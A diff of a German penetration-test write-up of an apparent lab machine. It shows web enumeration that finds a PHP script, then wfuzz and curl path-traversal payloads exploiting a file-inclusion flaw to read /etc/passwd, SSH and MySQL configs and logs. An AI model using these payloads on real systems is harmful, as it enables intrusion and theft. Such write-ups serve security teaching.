 <p class="evaluation">**Bewertung:** Dieser Gobuster-Scan liefert keine neuen, versteckten Verzeichnisse im Web-Root. Dies kann bedeuten, dass entweder keine weiteren relevanten Verzeichnisse auf dieser Ebene existieren oder die verwendete Wortliste nicht ausreichend ist. Es ist auch möglich, dass interessante Inhalte unter anderen virtuellen Hosts liegen, die wir noch nicht kennen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie es mit einer anderen, eventuell größeren oder spezialisierteren Wortliste. Verwenden Sie alternative Tools wie `feroxbuster` oder `dirsearch`, die möglicherweise andere Techniken oder Standardlisten verwenden. Suchen Sie nach Hinweisen auf virtuelle Hosts (z.B. in Zertifikaten, falls HTTPS verfügbar wäre, oder durch DNS-Enumeration, falls möglich).</p>
+<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie es mit einer anderen, eventuell größeren oder spezialisierteren Wortliste. Verwenden Sie alternative Tools wie <span class="command">feroxbuster</span> oder <span class="command">dirsearch</span>, die möglicherweise andere Techniken oder Standardlisten verwenden. Suchen Sie nach Hinweisen auf virtuelle Hosts (z.B. in Zertifikaten, falls HTTPS verfügbar wäre, oder durch DNS-Enumeration, falls möglich).<br>**Empfehlung (Admin):** Standard-Webseiten sollten angepasst oder entfernt werden, um Angreifern keine einfachen Ansatzpunkte oder Informationen über die Standardkonfiguration zu bieten.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -469,7 +469,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 ──────────────────────────────────────────────────
 <span class="command">200      GET       24l      126w    10354c http://192.168.2.192/icons/openlogo-75.png</span>
 <span class="command">200      GET      368l      933w    10701c http://192.168.2.192/</span>
-<span class="password">301      GET        9l       28w      318c http://192.168.2.192/ShadowSec => http://192.168.2.192/ShadowSec/</span>
+<span class="password">301      GET        9l       28w      318c http://192.168.2.192/ShadowSec =&gt; http://192.168.2.192/ShadowSec/</span>
 <span class="command">200      GET      368l      933w    10701c http://192.168.2.192/index.html</span>
 <span class="command">200      GET      185l      509w     6270c http://192.168.2.192/ShadowSec/index.html</span>
 [###&gt;----------------] - 4m   2423827/12351220 18m     found:5       errors:0      
@@ -480,14 +480,14 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester verwendet nun `feroxbuster`, ein weiteres Tool zur Web-Content-Enumeration.
-- `--url "http://192.168.2.192/"`: Ziel-URL.
-- `--wordlist ...directory-list-2.3-medium.txt`: Dieselbe Wortliste wie bei Gobuster.
-- `-x ...`: Eine lange Liste von Dateierweiterungen, die getestet werden sollen.
-- `-s 200 301 302`: Berücksichtigt nur Antworten mit diesen Statuscodes.
-Feroxbuster findet zusätzlich zu den bekannten Inhalten (`index.html`, `/icons/openlogo-75.png`) ein Verzeichnis `/ShadowSec/`. Der Statuscode `301` für `/ShadowSec` deutet auf eine permanente Weiterleitung hin, typischerweise von `verzeichnis` zu `verzeichnis/` (mit abschließendem Slash). Daraufhin wird `/ShadowSec/index.html` mit Status `200` gefunden. Der Scan wird nach einiger Zeit mit Strg+C abgebrochen.</p>
-<p class="evaluation">**Bewertung:** Der Fund des Verzeichnisses `/ShadowSec/` ist signifikant! Dies ist ein neues potenzielles Angriffsfeld, das Gobuster zuvor nicht (oder nicht so deutlich) angezeigt hat. Die Verwendung verschiedener Tools zur Enumeration kann oft zu unterschiedlichen oder ergänzenden Ergebnissen führen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie das Verzeichnis `/ShadowSec/` und die Datei `/ShadowSec/index.html` genauer. Betrachten Sie den Quellcode der `index.html` und führen Sie weitere Enumerationsscans (z.B. mit `dirb`, `wfuzz` oder erneut `feroxbuster`/`gobuster`) gezielt auf das Unterverzeichnis `/ShadowSec/` aus, um dort nach weiteren Dateien oder Skripten zu suchen.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle Webverzeichnisse, insbesondere solche mit potenziell sensitiven Namen wie "ShadowSec", angemessen geschützt sind und keine unnötigen Informationen oder Funktionalitäten preisgeben.</p>
+<p class="analysis">**Analyse:** Der Pentester verwendet nun <span class="command">feroxbuster</span>, ein weiteres Tool zur Web-Content-Enumeration.
+- <span class="command">--url "http://192.168.2.192/"</span>: Ziel-URL.
+- <span class="command">--wordlist ...directory-list-2.3-medium.txt</span>: Dieselbe Wortliste wie bei Gobuster.
+- <span class="command">-x ...</span>: Eine lange Liste von Dateierweiterungen, die getestet werden sollen.
+- <span class="command">-s 200 301 302</span>: Berücksichtigt nur Antworten mit diesen Statuscodes.
+Feroxbuster findet zusätzlich zu den bekannten Inhalten (<span class="command">index.html</span>, <span class="command">/icons/openlogo-75.png</span>) ein Verzeichnis <span class="password">/ShadowSec/</span>. Der Statuscode <span class="password">301</span> für <span class="command">/ShadowSec</span> deutet auf eine permanente Weiterleitung hin, typischerweise von <span class="command">verzeichnis</span> zu <span class="command">verzeichnis/</span> (mit abschließendem Slash). Daraufhin wird <span class="command">/ShadowSec/index.html</span> mit Status <span class="command">200</span> gefunden. Der Scan wird nach einiger Zeit mit Strg+C abgebrochen.</p>
+<p class="evaluation">**Bewertung:** Der Fund des Verzeichnisses <span class="password">/ShadowSec/</span> ist signifikant! Dies ist ein neues potenzielles Angriffsfeld, das Gobuster zuvor nicht (oder nicht so deutlich) angezeigt hat. Die Verwendung verschiedener Tools zur Enumeration kann oft zu unterschiedlichen oder ergänzenden Ergebnissen führen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie das Verzeichnis <span class="command">/ShadowSec/</span> und die Datei <span class="command">/ShadowSec/index.html</span> genauer. Betrachten Sie den Quellcode der <span class="command">index.html</span> und führen Sie weitere Enumerationsscans (z.B. mit <span class="command">dirb</span>, <span class="command">wfuzz</span> oder erneut <span class="command">feroxbuster</span>/<span class="command">gobuster</span>) gezielt auf das Unterverzeichnis <span class="command">/ShadowSec/</span> aus, um dort nach weiteren Dateien oder Skripten zu suchen.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle Webverzeichnisse, insbesondere solche mit potenziell sensitiven Namen wie "ShadowSec", angemessen geschützt sind und keine unnötigen Informationen oder Funktionalitäten preisgeben.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -504,7 +504,7 @@ Feroxbuster findet zusätzlich zu den bekannten Inhalten (`index.html`, `/icons/
 &lt;h2&gt;Quantum Protocol&lt;/h2&gt;
 
  
-            ▶ OPERATIVE: ll104567  (CODEX: BATTLE GOD)
+            ▶ OPERATIVE: <span class="command">ll104567</span>  (CODEX: BATTLE GOD)
             ◀ COMBAT SUCCESS RATE: 98.7%
             ▶ SHADOW SYNC: 100%
             ◀ LAST ACTIVE: 2025-04-04 21:37:05
@@ -520,9 +520,9 @@ Feroxbuster findet zusätzlich zu den bekannten Inhalten (`index.html`, `/icons/
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Quellcode der Seite `http://192.168.2.192/ShadowSec/` (wahrscheinlich `index.html`) wird angezeigt. Der Prompt `view-source:` deutet darauf hin, dass dies im Browser geschah oder der Quelltext anderweitig extrahiert wurde. Der Inhalt ist thematisch an eine Art taktische oder militärische Oberfläche angelehnt ("SHADOWSEC Tactical Interface", "OPERATIVE: ll104567", "CODEX: BATTLE GOD"). Es werden keine direkten Formulare, Skripte oder offensichtlichen Schwachstellen im sichtbaren HTML-Code aufgedeckt, aber der operative Name "ll104567" könnte ein Benutzername sein.</p>
-<p class="evaluation">**Bewertung:** Der Quellcode liefert interessante thematische Hinweise und einen potenziellen Benutzernamen ("ll104567"). Für sich genommen enthüllt er jedoch keine direkten Angriffsvektoren. Es ist wahrscheinlich, dass die Funktionalität dieser Seite serverseitig implementiert ist oder über andere, noch nicht entdeckte Skripte/Dateien im `/ShadowSec/`-Verzeichnis bereitgestellt wird.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Notieren Sie den potenziellen Benutzernamen "ll104567". Führen Sie eine gezielte Verzeichnis- und Dateisuche innerhalb von `/ShadowSec/` durch, um nach PHP-Skripten oder anderen aktiven Komponenten zu suchen. Achten Sie auf Kommentare im HTML-Quellcode, JavaScript-Dateien oder andere eingebettete Ressourcen.<br>**Empfehlung (Admin):** Vermeiden Sie die Offenlegung potenzieller Benutzernamen oder interner Codenamen in öffentlich zugänglichen Webseiten-Quelltexten, auch wenn sie thematisch eingebettet sind.</p>
+<p class="analysis">**Analyse:** Der Quellcode der Seite <span class="command">http://192.168.2.192/ShadowSec/</span> (wahrscheinlich <span class="command">index.html</span>) wird angezeigt. Der Prompt <span class="command">view-source:</span> deutet darauf hin, dass dies im Browser geschah oder der Quelltext anderweitig extrahiert wurde. Der Inhalt ist thematisch an eine Art taktische oder militärische Oberfläche angelehnt ("SHADOWSEC Tactical Interface", "OPERATIVE: ll104567", "CODEX: BATTLE GOD"). Es werden keine direkten Formulare, Skripte oder offensichtlichen Schwachstellen im sichtbaren HTML-Code aufgedeckt, aber der operative Name <span class="command">ll104567</span> könnte ein Benutzername sein.</p>
+<p class="evaluation">**Bewertung:** Der Quellcode liefert interessante thematische Hinweise und einen potenziellen Benutzernamen (<span class="command">ll104567</span>). Für sich genommen enthüllt er jedoch keine direkten Angriffsvektoren. Es ist wahrscheinlich, dass die Funktionalität dieser Seite serverseitig implementiert ist oder über andere, noch nicht entdeckte Skripte/Dateien im <span class="command">/ShadowSec/</span>-Verzeichnis bereitgestellt wird.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Notieren Sie den potenziellen Benutzernamen <span class="command">ll104567</span>. Führen Sie eine gezielte Verzeichnis- und Dateisuche innerhalb von <span class="command">/ShadowSec/</span> durch, um nach PHP-Skripten oder anderen aktiven Komponenten zu suchen. Achten Sie auf Kommentare im HTML-Quellcode, JavaScript-Dateien oder andere eingebettete Ressourcen.<br>**Empfehlung (Admin):** Vermeiden Sie die Offenlegung potenzieller Benutzernamen oder interner Codenamen in öffentlich zugänglichen Webseiten-Quelltexten, auch wenn sie thematisch eingebettet sind.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -534,15 +534,15 @@ Feroxbuster findet zusätzlich zu den bekannten Inhalten (`index.html`, `/icons/
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `dirb` wird verwendet, um gezielt das Verzeichnis `/ShadowSec/` zu scannen.
-- `dirb http://192.168.2.192/ShadowSec`: Das Zielverzeichnis.
-- `/usr/share/seclists/Discovery/Web-Content/creationBlackhat2021dirsearch.txt`: Eine spezifische Wortliste.
-- `-R`: Rekursiver Scan.
-- `-X .php,.txt,.jpg,.crt`: Sucht nach Dateien mit diesen Erweiterungen.
-- `| grep 200`: Filtert die Ausgabe nach erfolgreichen Funden (Statuscode 200).
-Das Ergebnis ist ein signifikanter Fund: `http://192.168.2.192/ShadowSec/bydataset.php`. Eine PHP-Datei namens `bydataset.php` wurde im `/ShadowSec/`-Verzeichnis gefunden.</p>
+<p class="analysis">**Analyse:** <span class="command">dirb</span> wird verwendet, um gezielt das Verzeichnis <span class="command">/ShadowSec/</span> zu scannen.
+- <span class="command">dirb http://192.168.2.192/ShadowSec</span>: Das Zielverzeichnis.
+- <span class="command">/usr/share/seclists/Discovery/Web-Content/creationBlackhat2021dirsearch.txt</span>: Eine spezifische Wortliste.
+- <span class="command">-R</span>: Rekursiver Scan.
+- <span class="command">-X .php,.txt,.jpg,.crt</span>: Sucht nach Dateien mit diesen Erweiterungen.
+- <span class="command">| grep 200</span>: Filtert die Ausgabe nach erfolgreichen Funden (Statuscode 200).
+Das Ergebnis ist ein signifikanter Fund: <span class="password">http://192.168.2.192/ShadowSec/bydataset.php</span>. Eine PHP-Datei namens <span class="command">bydataset.php</span> wurde im <span class="command">/ShadowSec/</span>-Verzeichnis gefunden.</p>
 <p class="evaluation">**Bewertung:** Ausgezeichnet! Die Entdeckung einer PHP-Datei in diesem Kontext ist vielversprechend, da PHP-Skripte oft dynamische Funktionalitäten und potenzielle Schwachstellen (wie LFI, RCE, SQLi) enthalten.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Rufen Sie die Datei `bydataset.php` im Browser auf oder mit `curl`, um ihren Inhalt und ihre Funktionsweise zu untersuchen. Prüfen Sie, ob sie Parameter entgegennimmt (GET oder POST) und wie sie auf verschiedene Eingaben reagiert. Fuzzing von Parametern ist hier ein logischer nächster Schritt.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle PHP-Skripte sicher programmiert sind und keine bekannten Schwachstellen aufweisen. Beschränken Sie den Zugriff auf Skripte, falls möglich, und validieren Sie alle Benutzereingaben serverseitig sorgfältig.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Rufen Sie die Datei <span class="command">bydataset.php</span> im Browser auf oder mit <span class="command">curl</span>, um ihren Inhalt und ihre Funktionsweise zu untersuchen. Prüfen Sie, ob sie Parameter entgegennimmt (GET oder POST) und wie sie auf verschiedene Eingaben reagiert. Fuzzing von Parametern ist hier ein logischer nächster Schritt.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle PHP-Skripte sicher programmiert sind und keine bekannten Schwachstellen aufweisen. Beschränken Sie den Zugriff auf Skripte, falls möglich, und validieren Sie alle Benutzereingaben serverseitig sorgfältig.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -552,13 +552,13 @@ http://192.168.2.192/ShadowSec/bydataset.php
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der direkte Aufruf der Datei `http://192.168.2.192/ShadowSec/bydataset.php` (vermutlich im Browser oder mit `curl` ohne Parameter) liefert nur die Meldung "Nothing to see here.". Dies deutet darauf hin, dass das Skript Parameter erwartet, um eine nützliche Funktion auszuführen, oder dass es eine bestimmte Bedingung für die Anzeige von Inhalten gibt.</p>
+<p class="analysis">**Analyse:** Der direkte Aufruf der Datei <span class="command">http://192.168.2.192/ShadowSec/bydataset.php</span> (vermutlich im Browser oder mit <span class="command">curl</span> ohne Parameter) liefert nur die Meldung "Nothing to see here.". Dies deutet darauf hin, dass das Skript Parameter erwartet, um eine nützliche Funktion auszuführen, oder dass es eine bestimmte Bedingung für die Anzeige von Inhalten gibt.</p>
 <p class="evaluation">**Bewertung:** Die Meldung ist nichtssagend, aber typisch für Skripte, die auf bestimmte Eingabeparameter warten. Das bedeutet nicht, dass das Skript ungefährlich oder nutzlos ist.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, gängige Parameter zu fuzzen (z.B. `file`, `page`, `id`, `cmd`, `url`) oder verwenden Sie Tools wie `wfuzz` oder Burp Intruder, um nach versteckten Parametern oder Schwachstellen wie Local File Inclusion (LFI) oder Remote File Inclusion (RFI) zu suchen.<br>**Empfehlung (Admin):** Skripte sollten informative Fehlermeldungen oder Statusseiten zurückgeben, wenn erforderliche Parameter fehlen, anstatt vage Aussagen zu treffen. Dies kann jedoch auch als Sicherheitsmaßnahme gesehen werden, um weniger Informationen preiszugeben.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, gängige Parameter zu fuzzen (z.B. <span class="command">file</span>, <span class="command">page</span>, <span class="command">id</span>, <span class="command">cmd</span>, <span class="command">url</span>) oder verwenden Sie Tools wie <span class="command">wfuzz</span> oder Burp Intruder, um nach versteckten Parametern oder Schwachstellen wie Local File Inclusion (LFI) oder Remote File Inclusion (RFI) zu suchen.<br>**Empfehlung (Admin):** Skripte sollten informative Fehlermeldungen oder Statusseiten zurückgeben, wenn erforderliche Parameter fehlen, anstatt vage Aussagen zu treffen. Dies kann jedoch auch als Sicherheitsmaßnahme gesehen werden, um weniger Informationen preiszugeben.</p>
         </section>
         <section id="lfi-exploitation">
             <h2>LFI Exploitation &amp; RCE</h2>
-<p class="comment">Nach der Entdeckung von `bydataset.php` versuchen wir, durch Fuzzing von Parametern eine Local File Inclusion (LFI)-Schwachstelle zu finden, um Dateien vom Server zu lesen.</p>
+<p class="comment">Nach der Entdeckung von <span class="command">bydataset.php</span> versuchen wir, durch Fuzzing von Parametern eine Local File Inclusion (LFI)-Schwachstelle zu finden, um Dateien vom Server zu lesen.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/Unreal_IRCd_3.2.8.1_Exploit]
@@ -586,15 +586,15 @@ Requests/sec.: 0
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `wfuzz` wird verwendet, um nach einem gültigen GET-Parameter für `bydataset.php` zu suchen, der eine LFI-Schwachstelle auslösen könnte.
-- `-c`: Farbige Ausgabe.
-- `-w ...directory-list-2.3-medium.txt`: Die Wortliste wird hier als Quelle für Parameternamen (Payloads für `FUZZ`) verwendet.
-- `-u "http://192.168.2.192/ShadowSec/bydataset.php?FUZZ=../../../../../../../../../etc/passwd"`: Die URL, bei der `FUZZ` durch jeden Eintrag der Wortliste ersetzt wird. Der Wert des Parameters ist bereits ein LFI-Payload-Versuch, um `/etc/passwd` zu lesen.
-- `--hc 404`: Versteckt Antworten mit Statuscode 404.
-- `--hh 21`: Versteckt Antworten mit 21 Zeichen (dies entspricht der Länge von "Nothing to see here.").
-Der entscheidende Fund ist `000000768:   200        27 L     39 W       1452 Ch     "file"`. Dies bedeutet, dass bei Verwendung des Parameters `file` (also `bydataset.php?file=...`) eine Antwort mit Status 200 und einer anderen Größe/Zeilenzahl als "Nothing to see here." zurückkam. Die Länge (1452 Chars) und Zeilenzahl (27 L) deuten stark darauf hin, dass der Inhalt von `/etc/passwd` erfolgreich gelesen wurde.</p>
-<p class="evaluation">**Bewertung:** Ausgezeichneter Fund! Eine LFI-Schwachstelle wurde im Parameter `file` von `bydataset.php` identifiziert. Wir können nun beliebige lesbare Dateien vom Server abrufen, indem wir den Pfad im `file`-Parameter angeben.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Bestätigen Sie die LFI, indem Sie `curl "http://192.168.2.192/ShadowSec/bydataset.php?file=../../../../../../../../../etc/passwd"` ausführen. Versuchen Sie, andere interessante Dateien zu lesen, wie z.B. Webserver-Konfigurationsdateien, Anwendungsquellcode (`bydataset.php` selbst), Logdateien, SSH-Schlüssel oder Shell-History-Dateien.<br>**Empfehlung (Admin):** Die LFI-Schwachstelle in `bydataset.php` muss sofort behoben werden. Benutzereingaben, die für Dateipfade verwendet werden, müssen strikt validiert und bereinigt werden (z.B. durch Whitelisting erlaubter Pfade/Dateien, Entfernung von `../`-Sequenzen, Verwendung von `basename()`). Idealerweise sollten Dateizugriffe nicht direkt durch unvalidierte Benutzereingaben gesteuert werden.</p>
+<p class="analysis">**Analyse:** <span class="command">wfuzz</span> wird verwendet, um nach einem gültigen GET-Parameter für <span class="command">bydataset.php</span> zu suchen, der eine LFI-Schwachstelle auslösen könnte.
+- <span class="command">-c</span>: Farbige Ausgabe.
+- <span class="command">-w ...directory-list-2.3-medium.txt</span>: Die Wortliste wird hier als Quelle für Parameternamen (Payloads für <span class="command">FUZZ</span>) verwendet.
+- <span class="command">-u "http://192.168.2.192/ShadowSec/bydataset.php?FUZZ=../../../../../../../../../etc/passwd"</span>: Die URL, bei der <span class="command">FUZZ</span> durch jeden Eintrag der Wortliste ersetzt wird. Der Wert des Parameters ist bereits ein LFI-Payload-Versuch, um <span class="command">/etc/passwd</span> zu lesen.
+- <span class="command">--hc 404</span>: Versteckt Antworten mit Statuscode 404.
+- <span class="command">--hh 21</span>: Versteckt Antworten mit 21 Zeichen (dies entspricht der Länge von "Nothing to see here.").
+Der entscheidende Fund ist <span class="password">000000768:   200        27 L     39 W       1452 Ch     "file"</span>. Dies bedeutet, dass bei Verwendung des Parameters <span class="command">file</span> (also <span class="command">bydataset.php?file=...</span>) eine Antwort mit Status 200 und einer anderen Größe/Zeilenzahl als "Nothing to see here." zurückkam. Die Länge (1452 Chars) und Zeilenzahl (27 L) deuten stark darauf hin, dass der Inhalt von <span class="command">/etc/passwd</span> erfolgreich gelesen wurde.</p>
+<p class="evaluation">**Bewertung:** Ausgezeichneter Fund! Eine LFI-Schwachstelle wurde im Parameter <span class="command">file</span> von <span class="command">bydataset.php</span> identifiziert. Wir können nun beliebige lesbare Dateien vom Server abrufen, indem wir den Pfad im <span class="command">file</span>-Parameter angeben.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Bestätigen Sie die LFI, indem Sie <span class="command">curl "http://192.168.2.192/ShadowSec/bydataset.php?file=../../../../../../../../../etc/passwd"</span> ausführen. Versuchen Sie, andere interessante Dateien zu lesen, wie z.B. Webserver-Konfigurationsdateien, Anwendungsquellcode (<span class="command">bydataset.php</span> selbst), Logdateien, SSH-Schlüssel oder Shell-History-Dateien.<br>**Empfehlung (Admin):** Die LFI-Schwachstelle in <span class="command">bydataset.php</span> muss sofort behoben werden. Benutzereingaben, die für Dateipfade verwendet werden, müssen strikt validiert und bereinigt werden (z.B. durch Whitelisting erlaubter Pfade/Dateien, Entfernung von <span class="command">../</span>-Sequenzen, Verwendung von <span class="command">basename()</span>). Idealerweise sollten Dateizugriffe nicht direkt durch unvalidierte Benutzereingaben gesteuert werden.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -632,9 +632,9 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der `curl`-Befehl bestätigt die LFI-Schwachstelle. Durch Angabe von `?file=../../../../../../../../../etc/passwd` wird der Inhalt der `/etc/passwd`-Datei des Servers erfolgreich ausgelesen und angezeigt. Diese Datei enthält Informationen über die Benutzerkonten auf dem System, deren UIDs, GIDs, Home-Verzeichnisse und Standard-Shells. Interessante Benutzer sind hier `pycrtlake` (UID 1000, Shell `/bin/bash`) und `chatlake` (UID 1001, Shell `/bin/sh`).</p>
+<p class="analysis">**Analyse:** Der <span class="command">curl</span>-Befehl bestätigt die LFI-Schwachstelle. Durch Angabe von <span class="command">?file=../../../../../../../../../etc/passwd</span> wird der Inhalt der <span class="command">/etc/passwd</span>-Datei des Servers erfolgreich ausgelesen und angezeigt. Diese Datei enthält Informationen über die Benutzerkonten auf dem System, deren UIDs, GIDs, Home-Verzeichnisse und Standard-Shells. Interessante Benutzer sind hier <span class="command">pycrtlake</span> (UID 1000, Shell <span class="command">/bin/bash</span>) und <span class="command">chatlake</span> (UID 1001, Shell <span class="command">/bin/sh</span>).</p>
 <p class="evaluation">**Bewertung:** Die LFI ist bestätigt und liefert wertvolle Informationen über die Benutzer des Systems. Dies kann für spätere Angriffsphasen, wie das Erraten von Passwörtern oder das Finden von Home-Verzeichnissen mit potenziell interessanten Dateien, genutzt werden.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die LFI weiter, um den Quellcode von `bydataset.php` selbst zu lesen (`?file=bydataset.php` oder den vollen Pfad, falls nötig). Dies könnte Aufschluss über weitere Funktionalitäten oder Schwachstellen geben. Versuchen Sie, andere Konfigurationsdateien (z.B. `/etc/ssh/sshd_config`, `/etc/apache2/apache2.conf` oder spezifische Anwendungskonfigurationen) oder Logdateien (z.B. `/var/log/apache2/access.log`) zu lesen.<br>**Empfehlung (Admin):** Dringende Behebung der LFI-Schwachstelle. Überprüfen Sie alle PHP-Skripte, die Dateiparameter entgegennehmen, auf ähnliche Schwachstellen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die LFI weiter, um den Quellcode von <span class="command">bydataset.php</span> selbst zu lesen (<span class="command">?file=bydataset.php</span> oder den vollen Pfad, falls nötig). Dies könnte Aufschluss über weitere Funktionalitäten oder Schwachstellen geben. Versuchen Sie, andere Konfigurationsdateien (z.B. <span class="command">/etc/ssh/sshd_config</span>, <span class="command">/etc/apache2/apache2.conf</span> oder spezifische Anwendungskonfigurationen) oder Logdateien (z.B. <span class="command">/var/log/apache2/access.log</span>) zu lesen.<br>**Empfehlung (Admin):** Dringende Behebung der LFI-Schwachstelle. Überprüfen Sie alle PHP-Skripte, die Dateiparameter entgegennehmen, auf ähnliche Schwachstellen.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -664,7 +664,9 @@ ID           Response   Lines    Word       Chars       Payload
 <span class="command">000005354:   200        31 L     105 W      77165 Ch    "/var/log/wtmp"</span>                                                                                                              
 <span class="command">000005445:   200        1 L      52 W       319 Ch      "/proc/self/stat"</span>                                                                                                            
 <span class="command">000005446:   200        54 L     132 W      1029 Ch     "/proc/self/status"</span>                                                                                                          
-... (Ausgabe gekürzt, viele weitere Funde) ...
+...
+...
+....
 <span class="command">000040529:   200        2 L      5 W        27 Ch       "..%2fetc%2fissue"</span>                                                                                                           
 <span class="command">000040501:   200        2 L      5 W        27 Ch       "../../../../../../etc/issue"</span> 
 
@@ -675,13 +677,13 @@ Requests/sec.: 0
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `wfuzz` wird erneut verwendet, diesmal um gängige Logdateien und andere Systemdateien über die LFI-Schwachstelle zu lesen.
-- `-w /usr/share/wordlists/logfiles.txt`: Verwendet eine Wortliste, die typische Pfade zu Logdateien enthält.
-- `-u "...?file=../../../../../../../../../FUZZ"`: `FUZZ` wird durch die Einträge aus `logfiles.txt` ersetzt.
-- `--hw 39 --hh 19 --hl 0`: Filtert Antworten basierend auf Anzahl der Wörter, Zeichen und Zeilen, um irrelevante Ergebnisse (wie "Nothing to see here." oder leere Antworten) auszublenden.
-Die Ausgabe zeigt eine Vielzahl erfolgreich gelesener Dateien, darunter `/proc/cmdline`, `/proc/version`, `/etc/group`, `/etc/hosts`, `/etc/mysql/my.cnf` (interessant, falls MySQL läuft), `/etc/issue`, `/etc/motd`, `/etc/ssh/sshd_config`, `/var/log/wtmp` (Login-Aufzeichnungen) und viele mehr. Auch URL-kodierte Varianten wie `..%2fetc%2fissue` funktionieren.</p>
+<p class="analysis">**Analyse:** <span class="command">wfuzz</span> wird erneut verwendet, diesmal um gängige Logdateien und andere Systemdateien über die LFI-Schwachstelle zu lesen.
+- <span class="command">-w /usr/share/wordlists/logfiles.txt</span>: Verwendet eine Wortliste, die typische Pfade zu Logdateien enthält.
+- <span class="command">-u "...?file=../../../../../../../../../FUZZ"</span>: <span class="command">FUZZ</span> wird durch die Einträge aus <span class="command">logfiles.txt</span> ersetzt.
+- <span class="command">--hw 39 --hh 19 --hl 0</span>: Filtert Antworten basierend auf Anzahl der Wörter, Zeichen und Zeilen, um irrelevante Ergebnisse (wie "Nothing to see here." oder leere Antworten) auszublenden.
+Die Ausgabe zeigt eine Vielzahl erfolgreich gelesener Dateien, darunter <span class="command">/proc/cmdline</span>, <span class="command">/proc/version</span>, <span class="command">/etc/group</span>, <span class="command">/etc/hosts</span>, <span class="command">/etc/mysql/my.cnf</span> (interessant, falls MySQL läuft), <span class="command">/etc/issue</span>, <span class="command">/etc/motd</span>, <span class="command">/etc/ssh/sshd_config</span>, <span class="command">/var/log/wtmp</span> (Login-Aufzeichnungen) und viele mehr. Auch URL-kodierte Varianten wie <span class="command">..%2fetc%2fissue</span> funktionieren.</p>
 <p class="evaluation">**Bewertung:** Die LFI ist sehr mächtig und erlaubt das Lesen einer breiten Palette von Systemdateien. Dies liefert eine Fülle von Informationen über die Systemkonfiguration, installierte Software, Benutzeraktivitäten und potenziell weitere Schwachstellen oder sensible Daten.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die Inhalte der wichtigsten gelesenen Dateien. Besonders `/etc/ssh/sshd_config` und `/etc/mysql/my.cnf` könnten Konfigurationsdetails oder sogar eingebettete Zugangsdaten (obwohl unwahrscheinlich für MySQL in `my.cnf` selbst) enthalten. Suchen Sie nach Hinweisen auf Webanwendungs-Konfigurationsdateien, die möglicherweise Datenbank-Zugangsdaten oder API-Schlüssel enthalten. Ein sehr wichtiges Ziel ist es, den Quellcode der Datei `bydataset.php` selbst zu lesen, um deren volle Funktionsweise zu verstehen.<br>**Empfehlung (Admin):** Dringende Behebung der LFI. Die Tatsache, dass so viele Systemdateien gelesen werden können, unterstreicht die Kritikalität dieser Schwachstelle. Webserver-Prozesse sollten außerdem in ihren Rechten so weit wie möglich eingeschränkt werden (Chroot, AppArmor, SELinux), um den Zugriff auf Systemdateien außerhalb des Web-Roots zu verhindern, selbst wenn eine LFI vorliegt.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die Inhalte der wichtigsten gelesenen Dateien. Besonders <span class="command">/etc/ssh/sshd_config</span> und <span class="command">/etc/mysql/my.cnf</span> könnten Konfigurationsdetails oder sogar eingebettete Zugangsdaten (obwohl unwahrscheinlich für MySQL in <span class="command">my.cnf</span> selbst) enthalten. Suchen Sie nach Hinweisen auf Webanwendungs-Konfigurationsdateien, die möglicherweise Datenbank-Zugangsdaten oder API-Schlüssel enthalten. Ein sehr wichtiges Ziel ist es, den Quellcode der Datei <span class="command">bydataset.php</span> selbst zu lesen, um deren volle Funktionsweise zu verstehen.<br>**Empfehlung (Admin):** Dringende Behebung der LFI. Die Tatsache, dass so viele Systemdateien gelesen werden können, unterstreicht die Kritikalität dieser Schwachstelle. Webserver-Prozesse sollten außerdem in ihren Rechten so weit wie möglich eingeschränkt werden (Chroot, AppArmor, SELinux), um den Zugriff auf Systemdateien außerhalb des Web-Roots zu verhindern, selbst wenn eine LFI vorliegt.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -699,9 +701,9 @@ ff02::2 ip6-allrouters
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Zur Bestätigung wird der Inhalt von `/etc/hosts` erneut mit `curl` und der LFI abgerufen. Die Ausgabe zeigt die lokalen Hostname-Mappings des Zielsystems, einschließlich `PyCrt.PyCrt` und `PyCrt` für die Loopback-Adresse `127.0.1.1`.</p>
